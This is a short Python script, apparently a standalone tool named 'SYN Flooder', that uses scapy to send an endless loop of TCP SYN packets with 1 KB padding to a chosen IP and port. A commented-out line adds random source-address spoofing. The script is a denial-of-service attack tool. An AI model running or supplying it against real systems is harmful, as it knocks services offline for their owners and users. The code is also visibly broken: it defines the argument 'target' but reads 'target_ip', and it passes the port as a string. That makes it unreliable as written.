#!/usr/bin/env python3


from scapy.all import *
import argparse


parser = argparse.ArgumentParser(description="SYN Flooder")
parser.add_argument("target", help="IP of targets router")
parser.add_argument("-p", "--port", help="The port of the target's machine service, \ (22 for SSH etc.)")


args = parser.parse_args()
target_ip = args.target_ip
target_port = args.port


ip = IP(dst=target_ip)

# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw
send(p, loop=1, verbose=0)
